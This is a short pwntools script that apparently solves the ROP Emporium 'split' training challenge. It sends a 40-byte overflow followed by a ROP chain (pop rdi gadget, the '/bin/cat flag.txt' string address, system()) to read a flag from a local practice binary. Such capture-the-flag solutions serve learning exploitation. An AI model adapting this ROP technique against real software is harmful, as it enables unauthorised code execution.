#! /usr/bin/env python3
# coding: utf-8

import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import *

#connect to the binary
exe = context.binary = ELF('./split')
io = process([exe.path])

# create payload 
payload = b"A"*40 # start with buffer
payload += p64(0x4007c3) # pop rdi                      
payload += p64(0x601060) # /bin/cat flag.txt
payload += p64(0x40074b) # system()

# send payload
io.sendline(payload)

# receive response
response = io.recvall()

print(re.search("(ROPE{.*?})", response.decode()))



        


